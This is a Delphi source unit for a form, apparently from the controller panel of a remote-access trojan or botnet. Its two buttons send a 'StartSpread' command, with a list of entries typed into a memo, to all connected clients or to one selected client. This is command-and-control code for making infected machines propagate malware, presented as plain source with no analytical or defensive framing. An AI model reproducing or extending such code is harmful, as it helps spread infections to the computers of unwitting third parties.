unit uSpread;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, PngBitBtn;

type
  TFrmSpread = class(TForm)
    PageControl1: TPageControl;
    GroupBox1: TGroupBox;
    MemoSpread: TMemo;
    GroupBox2: TGroupBox;
    btnAllSpread: TPngBitBtn;
    btnSpread: TPngBitBtn;
    procedure btnAllSpreadClick(Sender: TObject);
    procedure btnSpreadClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmSpread: TFrmSpread;

implementation

uses uGeneral;

{$R *.dfm}

procedure TFrmSpread.btnAllSpreadClick(Sender: TObject);
var
  i      :Integer;
  Buffer :String;
begin
  Buffer := '';
  for i := 0 to (FrmSpread.MemoSpread.Lines.Count-1) do
  begin
    Buffer := Buffer+'|'+FrmSpread.MemoSpread.Lines.Strings[i];
  end;
  for i := 0 to (FrmGeneral.ListUsers.Items.Count-1) do
  begin
    FrmGeneral.Server.Socket.Connections[i].SendText('StartSpread'+Buffer);
  end;
  MessageBoxA(0, PChar('Spread started!'), 'Information', 64);
end;

procedure TFrmSpread.btnSpreadClick(Sender: TObject);
var
  i      :Integer;
  Buffer :String;
begin
  Buffer := '';
  for i := 0 to (FrmSpread.MemoSpread.Lines.Count-1) do
  begin
    Buffer := Buffer+'|'+FrmSpread.MemoSpread.Lines.Strings[i];
  end;

  if (FrmGeneral.ListUsers.Selected <> nil) then
  begin
    FrmGeneral.Server.Socket.Connections[FrmGeneral.ListUsers.Selected.Index].SendText('StartSpread'+Buffer);
    MessageBoxA(0, PChar('Spread started!'), 'Information', 64);
  end else MessageBoxA(0, 'Select a user!', 'Information', 64);
end;

end.
